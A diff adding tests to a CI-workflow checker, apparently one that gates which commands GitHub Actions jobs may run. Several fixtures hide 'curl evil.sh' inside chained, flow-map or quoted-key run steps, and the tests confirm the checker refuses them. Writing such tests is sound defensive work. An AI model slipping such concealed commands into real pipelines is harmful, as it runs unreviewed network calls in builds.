@@ -384,6 +384,47 @@ it('R13 — a block-scalar run, no stages, and no jobs are all REFUSED', () => {
   assert.equal(runAndClean(converse(noJobs)), 1);
 });
 
+it('R13 — shapes that would hide a command are REFUSED in a checked job', () => {
+  // Each is a command the first-line reader passed. Verified red against bef9d61's gate (all 0).
+  const hostile = [
+    '      - run: pnpm check:a\n          && curl evil.sh\n',
+    '      - run: pnpm lint\n          && curl evil.sh\n',
+    '      - {name: x, run: curl evil.sh}\n',
+    '      - "run": curl evil.sh\n',
+    "      - 'run': curl evil.sh\n",
+    '      - run: pnpm lint\n        working-directory: apps/web\n',
+  ];
+  for (const body of hostile) {
+    const root = converse({ '.github/workflows/ci.yml': workflow(step('check:a') + body) });
+    assert.equal(runAndClean(root), 1, `must be refused: ${body}`);
+  }
+});
+
+it('R13 — a working-directory in a job listed under ciOnly.jobs is not refused', () => {
+  const ci =
+    workflow(step('check:a')) +
+    '  image:\n    steps:\n      - run: docker build .\n        working-directory: apps/web\n';
+  const root = converse({ '.github/workflows/ci.yml': ci }, { jobs: { image: 'Docker work.' } });
+  assert.equal(runAndClean(root), 0);
+});
+
+it('R9 — an env entry named run is not a command', () => {
+  // Verified red against bef9d61's gate: it read the env value as a step command (1).
+  const body =
+    '      - name: x\n        run: pnpm lint\n        env:\n          run: not-a-command\n';
+  const root = converse({ '.github/workflows/ci.yml': workflow(step('check:a') + body) });
+  assert.equal(runAndClean(root), 0);
+});
+
+it('R11 — a ciOnly.commands key is whitespace-normalised like the commands', () => {
+  // Verified red against bef9d61's gate: the double-spaced key never matched (1).
+  const root = converse(
+    { '.github/workflows/ci.yml': withRuns('pnpm build') },
+    { commands: { 'pnpm  build': 'Builds.' } },
+  );
+  assert.equal(runAndClean(root), 0);
+});
+
 // ---------------------------------------------------------------- the two that carry the gate
 
 it('R6 — a gate named only in a COMMENT is not covered', () => {
